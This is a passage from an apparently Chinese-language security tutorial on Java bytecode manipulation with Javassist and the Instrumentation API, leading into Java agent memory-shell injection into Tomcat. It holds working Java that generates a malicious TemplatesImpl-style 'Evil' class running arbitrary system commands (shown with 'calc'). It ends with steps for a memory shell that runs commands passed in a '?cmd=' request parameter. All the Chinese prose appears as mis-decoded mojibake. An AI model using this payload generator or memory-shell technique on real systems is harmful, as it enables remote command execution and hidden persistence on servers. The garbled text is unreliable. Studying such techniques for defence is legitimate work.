&#125;<br>&#125;<br><br> <br></code></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523506.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>åˆ›å»ºå¥½çš„ Person.class</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> javassist;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;aaa&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String var1)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = var1;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.name = <span class="hljs-string">&quot;aaa&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello World&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>





<h4 id="ä½¿ç”¨Javassistç”Ÿæˆæ¶æ„class"><a href="#ä½¿ç”¨Javassistç”Ÿæˆæ¶æ„class" class="headerlink" title="ä½¿ç”¨Javassistç”Ÿæˆæ¶æ„class"></a>ä½¿ç”¨Javassistç”Ÿæˆæ¶æ„class</h4><p>ä»å­—èŠ‚ç å±‚é¢ç”Ÿæˆæ¶æ„ class ï¼Œè·³è¿‡æ¶æ„ç±»çš„ç¼–è¯‘è¿‡ç¨‹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.javassist;<br><br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">createShell</span> &#123;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ç”ŸæˆåŒ…å«æ¶æ„å‘½ä»¤çš„TemplatesImplå­—èŠ‚ç </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cmd è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> ç”Ÿæˆçš„å­—èŠ‚ç æ•°ç»„</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplatesImpl(String cmd) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// è·å–é»˜è®¤çš„ç±»æ± </span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <br>            <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»ï¼Œåä¸º&quot;Evil&quot;</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>            <br>            <span class="hljs-comment">// è·å–AbstractTransletç±»ä½œä¸ºçˆ¶ç±»</span><br>            <span class="hljs-comment">// è¿™æ˜¯XSLTè½¬æ¢å™¨çš„åŸºç±»ï¼Œå¸¸ç”¨äºJavaååºåˆ—åŒ–åˆ©ç”¨</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);<br>            ctClass.setSuperclass(superClass);<br>            <br>            <span class="hljs-comment">// åˆ›å»ºç±»çš„åˆå§‹åŒ–æ„é€ å‡½æ•°</span><br>            <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">ctConstructor</span> <span class="hljs-operator">=</span> ctClass.makeClassInitializer();<br>            <br>            <span class="hljs-comment">// åœ¨æ„é€ å‡½æ•°ä½“ä¸­æ’å…¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ä»£ç </span><br>            ctConstructor.setBody(<span class="hljs-string">&quot;try&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;            Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="hljs-string">&quot;\&quot;);\n&quot;</span> +  <span class="hljs-comment">// æ‰§è¡Œä¼ å…¥çš„å‘½ä»¤</span><br>                    <span class="hljs-string">&quot;        &#125;catch (Exception e)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;        &#125;&quot;</span>);  <span class="hljs-comment">// å¼‚å¸¸å¤„ç†ï¼Œé™é»˜å¤±è´¥</span><br>            <br>            <span class="hljs-comment">// å°†CtClassè½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <br>            <span class="hljs-comment">// ä»ç±»æ± ä¸­åˆ†ç¦»è¯¥ç±»ï¼Œé‡Šæ”¾èµ„æº</span><br>            ctClass.detach();<br>            <br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;&#125;;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * å°†ç”Ÿæˆçš„æ¶æ„ç±»å­—èŠ‚ç å†™å…¥æ–‡ä»¶</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeShell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// ç”Ÿæˆæ‰§è¡Œcalcå‘½ä»¤çš„æ¶æ„å­—èŠ‚ç </span><br>        <span class="hljs-type">byte</span>[] shell = createShell.getTemplatesImpl(<span class="hljs-string">&quot;calc&quot;</span>);<br>        <br>        <span class="hljs-comment">// åˆ›å»ºæ–‡ä»¶è¾“å‡ºæµï¼Œå°†å­—èŠ‚ç å†™å…¥bbb.classæ–‡ä»¶</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;bbb.class&quot;</span>));<br>        fileOutputStream.write(shell);<br>        <br>        <span class="hljs-comment">// æ³¨æ„ï¼šè¿™é‡Œåº”è¯¥å…³é—­æµï¼Œå»ºè®®ä½¿ç”¨try-with-resources</span><br>        fileOutputStream.close();<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ä¸»æ–¹æ³• - ç¨‹åºå…¥å£</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> args å‘½ä»¤è¡Œå‚æ•°</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Exception</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        writeShell();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523107.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var1) &#123;<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>







<h3 id="4-2-2-Instrumentation-åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç "><a href="#4-2-2-Instrumentation-åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç " class="headerlink" title="4.2.2 Instrumentation åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç "></a>4.2.2 Instrumentation åŠ¨æ€ä¿®æ”¹å­—èŠ‚ç </h3><p> Instrumentationæ˜¯ JVMTIAgentï¼ˆJVM Tool Interface Agentï¼‰çš„ä¸€éƒ¨åˆ†ï¼ŒJava agenté€šè¿‡è¿™ä¸ªç±»å’Œç›®æ ‡ JVM è¿›è¡Œäº¤äº’ï¼Œä»è€Œè¾¾åˆ°ä¿®æ”¹æ•°æ®çš„æ•ˆæœã€‚  </p>
<p> å…¶åœ¨Javaä¸­æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå¸¸ç”¨æ–¹æ³•å¦‚ä¸‹  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Instrumentation</span> &#123;<br>    <br>    <span class="hljs-comment">//å¢åŠ ä¸€ä¸ªClass æ–‡ä»¶çš„è½¬æ¢å™¨ï¼Œè½¬æ¢å™¨ç”¨äºæ”¹å˜ Class äºŒè¿›åˆ¶æµçš„æ•°æ®ï¼Œå‚æ•° canRetransform è®¾ç½®æ˜¯å¦å…è®¸é‡æ–°è½¬æ¢ã€‚</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer, <span class="hljs-type">boolean</span> canRetransform)</span>;<br> <br>    <span class="hljs-comment">//åœ¨ç±»åŠ è½½ä¹‹å‰ï¼Œé‡æ–°å®šä¹‰ Class æ–‡ä»¶ï¼ŒClassDefinition è¡¨ç¤ºå¯¹ä¸€ä¸ªç±»æ–°çš„å®šä¹‰ï¼Œå¦‚æœåœ¨ç±»åŠ è½½ä¹‹åï¼Œéœ€è¦ä½¿ç”¨ retransformClasses æ–¹æ³•é‡æ–°å®šä¹‰ã€‚addTransformeræ–¹æ³•é…ç½®ä¹‹åï¼Œåç»­çš„ç±»åŠ è½½éƒ½ä¼šè¢«Transformeræ‹¦æˆªã€‚å¯¹äºå·²ç»åŠ è½½è¿‡çš„ç±»ï¼Œå¯ä»¥æ‰§è¡ŒretransformClassesæ¥é‡æ–°è§¦å‘è¿™ä¸ªTransformerçš„æ‹¦æˆªã€‚ç±»åŠ è½½çš„å­—èŠ‚ç è¢«ä¿®æ”¹åï¼Œé™¤éå†æ¬¡è¢«retransformï¼Œå¦åˆ™ä¸ä¼šæ¢å¤ã€‚</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span>;<br> <br>    <span class="hljs-comment">//åˆ é™¤ä¸€ä¸ªç±»è½¬æ¢å™¨</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">removeTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span>;<br> <br> <br>    <span class="hljs-comment">//åœ¨ç±»åŠ è½½ä¹‹åï¼Œé‡æ–°å®šä¹‰ Classã€‚è¿™ä¸ªå¾ˆé‡è¦ï¼Œè¯¥æ–¹æ³•æ˜¯1.6 ä¹‹ååŠ å…¥çš„ï¼Œäº‹å®ä¸Šï¼Œè¯¥æ–¹æ³•æ˜¯ update äº†ä¸€ä¸ªç±»ã€‚</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">retransformClasses</span><span class="hljs-params">(Class&lt;?&gt;... classes)</span> <span class="hljs-keyword">throws</span> UnmodifiableClassException;<br> <br>    <span class="hljs-comment">//åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯å¦è¢«ä¿®æ”¹</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isModifiableClass</span><span class="hljs-params">(Class&lt;?&gt; theClass)</span>;<br> <br>    <span class="hljs-comment">// è·å–ç›®æ ‡å·²ç»åŠ è½½çš„ç±»ã€‚</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;rawtypes&quot;)</span><br>    Class[] getAllLoadedClasses();<br> <br>    <span class="hljs-comment">//è·å–ä¸€ä¸ªå¯¹è±¡çš„å¤§å°</span><br>    <span class="hljs-type">long</span> <span class="hljs-title function_">getObjectSize</span><span class="hljs-params">(Object objectToSize)</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h4 id="è·å–ç›®æ ‡JVMå·²åŠ è½½ç±»"><a href="#è·å–ç›®æ ‡JVMå·²åŠ è½½ç±»" class="headerlink" title="è·å–ç›®æ ‡JVMå·²åŠ è½½ç±»"></a>è·å–ç›®æ ‡JVMå·²åŠ è½½ç±»</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Java_Agent_agentmain_Instrumentation</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args,  Instrumentation inst)</span> <span class="hljs-keyword">throws</span> InterruptedException&#123;<br>        Class[] classes = inst.getAllLoadedClasses();<br><br>        <span class="hljs-keyword">for</span>(Class cls : classes)&#123;<br>            System.out.println(<span class="hljs-string">&quot;=======================&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;åŠ è½½ç±»ï¼š&quot;</span> + cls.getName());<br>            System.out.println(<span class="hljs-string">&quot;æ˜¯å¦å¯è¢«ä¿®æ”¹ï¼š&quot;</span> + inst.isModifiableClass(cls));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">Manifest-Version: 1.0<br>Agent-Class: com.test.Java_Agent_agentmain_Instrumentation<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br>Can-Set-Native-Method-Prefix: true<br></code></pre></td></tr></table></figure>



<p>åˆ›å»º jar</p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">jar cvfm Instrumentation.jar ..\src\main\resources\MANIFEST.MF .\Java_Agent_agentmain_Instrumentation.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081533461.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>ä½¿ç”¨ InjectAgent.java æµ‹è¯•</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081524580.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p> èƒ½å¤Ÿè·å–ç›®æ ‡JVMå·²åŠ è½½ç±»</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523648.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h4 id="transform-è½¬æ¢å™¨"><a href="#transform-è½¬æ¢å™¨" class="headerlink" title="transform - è½¬æ¢å™¨"></a>transform - è½¬æ¢å™¨</h4><p>åœ¨Instrumentationæ¥å£ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡**addTransformer()**æ¥æ·»åŠ ä¸€ä¸ªtransformerï¼ˆè½¬æ¢å™¨ï¼‰ï¼Œå…³é”®å±æ€§å°±æ˜¯ClassFileTransformerç±»ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å¢åŠ ä¸€ä¸ªClass æ–‡ä»¶çš„è½¬æ¢å™¨ï¼Œè½¬æ¢å™¨ç”¨äºæ”¹å˜ Class äºŒè¿›åˆ¶æµçš„æ•°æ®ï¼Œå‚æ•° canRetransform è®¾ç½®æ˜¯å¦å…è®¸é‡æ–°è½¬æ¢ã€‚</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer, <span class="hljs-type">boolean</span> canRetransform)</span>;<br></code></pre></td></tr></table></figure>



<p><strong>ClassFileTransformer</strong>æ¥å£ä¸­åªæœ‰ä¸€ä¸ª**transform()**æ–¹æ³•ï¼Œè¿”å›å€¼ä¸ºå­—èŠ‚æ•°ç»„ï¼Œä½œä¸ºè½¬æ¢åçš„å­—èŠ‚ç æ³¨å…¥åˆ°ç›®æ ‡JVMä¸­ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523698.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>åœ¨é€šè¿‡ addTransformer æ³¨å†Œä¸€ä¸ªtransformeråï¼Œæ¯æ¬¡å®šä¹‰æˆ–è€…é‡å®šä¹‰æ–°ç±»éƒ½ä¼šè°ƒç”¨transformerã€‚æ‰€è°“å®šä¹‰ï¼Œå³æ˜¯é€šè¿‡ClassLoader.defineClassåŠ è½½è¿›æ¥çš„ç±»ã€‚è€Œé‡å®šä¹‰æ˜¯é€šè¿‡Instrumentation.redefineClassesæ–¹æ³•é‡å®šä¹‰çš„ç±»ã€‚</p>
<p>å½“å­˜åœ¨å¤šä¸ªè½¬æ¢å™¨æ—¶ï¼Œè½¬æ¢å°†ç”± transform è°ƒç”¨é“¾ç»„æˆã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ª transform è°ƒç”¨è¿”å›çš„ byte æ•°ç»„å°†æˆä¸ºä¸‹ä¸€ä¸ªè°ƒç”¨çš„è¾“å…¥ï¼ˆé€šè¿‡ classfileBuffer å‚æ•°ï¼‰ã€‚</p>
<p>è½¬æ¢å°†æŒ‰ä»¥ä¸‹é¡ºåºåº”ç”¨ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">ä¸å¯é‡è½¬æ¢è½¬æ¢å™¨<br>ä¸å¯é‡è½¬æ¢æœ¬æœºè½¬æ¢å™¨<br>å¯é‡è½¬æ¢è½¬æ¢å™¨<br>å¯é‡è½¬æ¢æœ¬æœºè½¬æ¢å™¨<br></code></pre></td></tr></table></figure>



<p>è‡³äºtransformerä¸­å¯¹å­—èŠ‚ç çš„å…·ä½“æ“ä½œï¼Œåˆ™éœ€è¦ä½¿ç”¨åˆ°Javassisitç±»ã€‚</p>
<h4 id="Instrumentationçš„å±€é™æ€§"><a href="#Instrumentationçš„å±€é™æ€§" class="headerlink" title="Instrumentationçš„å±€é™æ€§"></a>Instrumentationçš„å±€é™æ€§</h4><p>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨Instrumentationéƒ½æ˜¯ä½¿ç”¨å…¶å­—èŠ‚ç æ’æ¡©çš„åŠŸèƒ½ï¼Œç®€å•æ¥è¯´å°±æ˜¯ç±»é‡å®šä¹‰åŠŸèƒ½ï¼ˆClass Redefineï¼‰ï¼Œä½†æ˜¯æœ‰ä»¥ä¸‹å±€é™æ€§ï¼š</p>
<p>premainå’Œagentmainä¸¤ç§æ–¹å¼ä¿®æ”¹å­—èŠ‚ç çš„æ—¶æœºéƒ½æ˜¯ç±»æ–‡ä»¶åŠ è½½ä¹‹åï¼Œä¹Ÿå°±æ˜¯è¯´å¿…é¡»è¦å¸¦æœ‰Classç±»å‹çš„å‚æ•°ï¼Œä¸èƒ½é€šè¿‡å­—èŠ‚ç æ–‡ä»¶å’Œè‡ªå®šä¹‰çš„ç±»åé‡æ–°å®šä¹‰ä¸€ä¸ªæœ¬æ¥ä¸å­˜åœ¨çš„ç±»ã€‚</p>
<p>ç±»çš„å­—èŠ‚ç ä¿®æ”¹ç§°ä¸ºç±»è½¬æ¢(Class Transform)ï¼Œç±»è½¬æ¢å…¶å®æœ€ç»ˆéƒ½å›å½’åˆ°ç±»é‡å®šä¹‰I<code>nstrumentation#redefineClasses</code>æ–¹æ³•ï¼Œæ­¤æ–¹æ³•æœ‰ä»¥ä¸‹é™åˆ¶ï¼š</p>
<ol>
<li>æ–°ç±»å’Œè€ç±»çš„çˆ¶ç±»å¿…é¡»ç›¸åŒ</li>
<li>æ–°ç±»å’Œè€ç±»å®ç°çš„æ¥å£æ•°ä¹Ÿè¦ç›¸åŒï¼Œå¹¶ä¸”æ˜¯ç›¸åŒçš„æ¥å£</li>
<li>æ–°ç±»å’Œè€ç±»è®¿é—®ç¬¦å¿…é¡»ä¸€è‡´ã€‚ æ–°ç±»å’Œè€ç±»å­—æ®µæ•°å’Œå­—æ®µåè¦ä¸€è‡´</li>
<li>æ–°ç±»å’Œè€ç±»æ–°å¢æˆ–åˆ é™¤çš„æ–¹æ³•å¿…é¡»æ˜¯private static&#x2F;finalä¿®é¥°çš„</li>
<li>å¯ä»¥ä¿®æ”¹æ–¹æ³•ä½“</li>
</ol>
<h2 id="4-3-Agent-å†…å­˜é©¬æ³¨å…¥"><a href="#4-3-Agent-å†…å­˜é©¬æ³¨å…¥" class="headerlink" title="4.3 Agent å†…å­˜é©¬æ³¨å…¥"></a>4.3 Agent å†…å­˜é©¬æ³¨å…¥</h2><p>çœ‹äº†è®¸å¤šå¸ˆå‚…å…³äºAgentå†…å­˜é©¬æ³¨å…¥çš„æ–‡ç« å’Œåšå®¢ï¼Œå„æœ‰åƒç§‹ï¼Œåˆ©ç”¨æ–¹å¼ä¹Ÿå„ä¸ç›¸åŒã€‚ç°åœ¨ï¼Œæˆ‘æ ¹æ®è‡ªå·±çš„ç†è§£æ¥ç¼–å†™ä¸€ä¸ªå°demoã€‚</p>
<h3 id="4-3-1-æ–¹å¼ä¸€ï¼ˆåç»­å¯èƒ½ä¼šå¤ç°å…¶ä»–å¸ˆå‚…çš„åˆ©ç”¨æ–¹å¼ï¼‰"><a href="#4-3-1-æ–¹å¼ä¸€ï¼ˆåç»­å¯èƒ½ä¼šå¤ç°å…¶ä»–å¸ˆå‚…çš„åˆ©ç”¨æ–¹å¼ï¼‰" class="headerlink" title="4.3.1 æ–¹å¼ä¸€ï¼ˆåç»­å¯èƒ½ä¼šå¤ç°å…¶ä»–å¸ˆå‚…çš„åˆ©ç”¨æ–¹å¼ï¼‰"></a>4.3.1 æ–¹å¼ä¸€ï¼ˆåç»­å¯èƒ½ä¼šå¤ç°å…¶ä»–å¸ˆå‚…çš„åˆ©ç”¨æ–¹å¼ï¼‰</h3><h4 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h4><ol>
<li>ç¼–è¯‘å¹¶æ‰“åŒ… <code>AgentMemShell</code> ä¸º <code>agentmemshell.jar</code>ã€‚</li>
<li>ç¼–è¯‘ <code>Injector</code>ï¼ˆéœ€è¦ <code>tools.jar</code>ï¼Œé€šå¸¸åœ¨ <code>JAVA_HOME/lib/</code> ä¸‹ï¼‰ã€‚</li>
<li>è¿è¡Œ <code>Injector</code>ï¼ŒæŒ‡å®šç›®æ ‡ Tomcat çš„ PIDã€‚</li>
<li>è®¿é—®ä»»ä½• Servlet è·¯å¾„ï¼Œå¸¦ä¸Š <code>?cmd=whoami</code> å‚æ•°ï¼Œå³å¯æ‰§è¡Œå‘½ä»¤ã€‚</li>
</ol>
